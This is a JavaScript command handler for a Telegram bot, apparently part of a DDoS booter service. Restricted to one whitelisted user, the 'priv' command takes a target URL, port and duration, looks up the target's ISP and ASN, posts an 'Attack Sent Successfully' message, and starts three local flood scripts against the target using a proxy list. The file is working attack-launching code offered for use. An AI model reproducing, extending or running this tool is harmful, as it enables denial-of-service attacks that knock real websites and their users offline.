const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = [6044526334];

module.exports = {
  command: ["priv"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (!allowedId.includes(senderId)) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\npriv https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
╭━⭓ <b>「 Attack Sent Successfully 」</b>
┃╭─────────────────────
┃┃🌐 <b>Host:</b> ${hostname}
┃┃📌 <b>Port:</b> ${port}
┃┃⏱️ <b>Duration:</b> ${duration}s
┃╰─────────────────────
┃╭─────────────────────
┃┃⚡️ <b>Method:</b> Priv
┃┃🏢 <b>ISP:</b> ${info.isp}
┃┃🏷️ <b>ASN:</b> ${info.as}
┃┃🌍 <b>IP:</b> ${info.query}
┃╰─────────────────────
╰━━━━━━━━━━━━━━━━━━━━━━━⭓
</blockquote>`;

    await client.sendFile(message.chatId, {
      file: "https://files.catbox.moe/l138g9.mp4",
      caption: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const kontol = path.join(__dirname, `../lib/cache/killer`);
    const tolol = path.join(__dirname, `../lib/cache/star`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${kontol} ${target} ${duration} 64 5 proxy.txt`);
    exec(`node ${tolol} ${target} ${duration} 500 4 proxy.txt flood`);
  },
};